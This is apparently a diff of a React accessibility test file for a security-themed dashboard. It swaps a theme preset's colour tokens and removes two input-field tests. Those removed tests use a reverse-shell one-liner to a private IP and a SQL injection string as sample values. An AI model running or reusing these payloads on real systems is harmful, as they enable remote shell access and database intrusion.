@@ -3,7 +3,6 @@ import { render, screen, fireEvent, act, cleanup, waitFor } from '@testing-libra
 import { MemoryRouter } from 'react-router-dom';
 import { CyberButton } from '../../components/common/CyberButton';
 import { CyberSelect, CyberMultiSelect } from '../../components/common/CyberSelect';
-import { CyberInput } from '../../components/common/CyberInput';
 import { ToastContainer } from '../../components/common/ToastContainer';
 import { useToastStore, toast } from '../../store/useToastStore';
 import { UnifiedHeader } from '../../components/layout/UnifiedHeader';
@@ -54,28 +53,28 @@ const THEME_PRESET_TOKENS = {
       borderAccent: [14, 165, 233] as [number, number, number],      // #0ea5e9 (Sky)
     },
   },
-  monolith: {
+  offsec: {
     light: {
-      surfaceBase: [250, 250, 250] as [number, number, number],      // #fafafa
-      surfaceCard: [255, 255, 255] as [number, number, number],      // #ffffff
-      surfaceElevated: [255, 255, 255] as [number, number, number],  // #ffffff
-      surfaceSunken: [244, 244, 245] as [number, number, number],    // #f4f4f5
-      textPrimary: [9, 9, 11] as [number, number, number],           // #09090b
-      textSecondary: [51, 65, 85] as [number, number, number],       // #334155
-      textMuted: [82, 82, 91] as [number, number, number],           // #52525b
-      textTertiary: [113, 113, 122] as [number, number, number],     // #71717a
-      borderAccent: [2, 132, 199] as [number, number, number],       // #0284c7
+      surfaceBase: [248, 250, 252] as [number, number, number],       // #f8fafc
+      surfaceCard: [255, 255, 255] as [number, number, number],       // #ffffff
+      surfaceElevated: [255, 255, 255] as [number, number, number],   // #ffffff
+      surfaceSunken: [226, 232, 240] as [number, number, number],     // #e2e8f0
+      textPrimary: [15, 23, 42] as [number, number, number],          // #0f172a
+      textSecondary: [51, 65, 85] as [number, number, number],        // #334155
+      textMuted: [71, 85, 105] as [number, number, number],           // #475569
+      textTertiary: [89, 103, 124] as [number, number, number],       // #59677c
+      borderAccent: [185, 28, 28] as [number, number, number],        // #b91c1c (Deep Blood Red)
     },
     dark: {
-      surfaceBase: [24, 24, 27] as [number, number, number],         // #18181b
-      surfaceCard: [39, 39, 42] as [number, number, number],         // #27272a
-      surfaceElevated: [50, 50, 56] as [number, number, number],     // #323238
-      surfaceSunken: [9, 9, 11] as [number, number, number],         // #09090b
+      surfaceBase: [9, 9, 12] as [number, number, number],            // #09090c
+      surfaceCard: [16, 16, 21] as [number, number, number],          // #101015
+      surfaceElevated: [22, 22, 28] as [number, number, number],      // #16161c
+      surfaceSunken: [5, 5, 8] as [number, number, number],           // #050508
       textPrimary: [244, 244, 245] as [number, number, number],       // #f4f4f5
-      textSecondary: [228, 228, 231] as [number, number, number],   // #e4e4e7
-      textMuted: [161, 161, 170] as [number, number, number],       // #a1a1aa
-      textTertiary: [113, 113, 122] as [number, number, number],     // #71717a
-      borderAccent: [56, 189, 248] as [number, number, number],      // #38bdf8
+      textSecondary: [228, 228, 231] as [number, number, number],     // #e4e4e7
+      textMuted: [161, 161, 170] as [number, number, number],         // #a1a1aa
+      textTertiary: [135, 135, 143] as [number, number, number],      // #87878f
+      borderAccent: [255, 70, 70] as [number, number, number],        // #ff4646 (Tactical Red)
     },
   },
   htb: {
@@ -133,8 +132,8 @@ describe('Milestone 1 Challenger 2: Accessibility & Interactive Invariants Adver
   // =========================================================================
   // SECTION 1: WCAG 2.1 AA Contrast Ratios Across All 3 Presets in Both Modes
   // =========================================================================
-  describe('1. WCAG 2.1 AA Contrast Ratios Across Presets (Obsidian, Monolith, HTB)', () => {
-    const presets: ThemePreset[] = ['obsidian', 'monolith', 'htb'];
+  describe('1. WCAG 2.1 AA Contrast Ratios Across Presets (Obsidian, OffSec, HTB)', () => {
+    const presets: ThemePreset[] = ['obsidian', 'offsec', 'htb'];
     const modes: ('light' | 'dark')[] = ['light', 'dark'];
 
     presets.forEach((preset) => {
@@ -391,45 +390,6 @@ describe('Milestone 1 Challenger 2: Accessibility & Interactive Invariants Adver
         expect(screen.queryByRole('listbox')).not.toBeInTheDocument();
       });
     });
-
-    it('CyberInput: includes focus ring and links error description via aria-describedby', () => {
-      render(
-        <CyberInput
-          id="exploit-payload"
-          label="Payload Command"
-          error="Payload cannot contain null bytes"
-          value="sh -i >& /dev/tcp/10.10.14.99/4444 0>&1"
-          onChange={() => {}}
-        />
-      );
-
-      const input = screen.getByLabelText('Payload Command');
-      expect(input).toHaveAttribute('aria-invalid', 'true');
-      expect(input).toHaveAttribute('aria-describedby', 'exploit-payload-error');
-      expect(input.className).toContain('focus:ring-accent');
-
-      const errorText = screen.getByRole('alert');
-      expect(errorText).toHaveTextContent('Payload cannot contain null bytes');
-      expect(errorText).toHaveAttribute('id', 'exploit-payload-error');
-    });
-
-    it('CyberInput: clearable button is accessible and triggers onClear callback', () => {
-      const handleClear = vi.fn();
-      render(
-        <CyberInput
-          id="search-input"
-          value="admin' OR 1=1--"
-          clearable
-          onClear={handleClear}
-          onChange={() => {}}
-        />
-      );
-
-      const clearBtn = screen.getByRole('button', { name: 'Clear input' });
-      expect(clearBtn).toBeInTheDocument();
-      fireEvent.click(clearBtn);
-      expect(handleClear).toHaveBeenCalledTimes(1);
-    });
   });
 
   // =========================================================================
@@ -437,7 +397,7 @@ describe('Milestone 1 Challenger 2: Accessibility & Interactive Invariants Adver
   // =========================================================================
   describe('4. Rapid Theme Toggling & Toast Notification Stress Hardening', () => {
     it('survives 100 rapid sequential theme toggles and preset switches without DOM corruption or thrown errors', () => {
-      const presets: ThemePreset[] = ['obsidian', 'monolith', 'htb'];
+      const presets: ThemePreset[] = ['obsidian', 'offsec', 'htb'];
 
       expect(() => {
         for (let i = 0; i < 100; i++) {
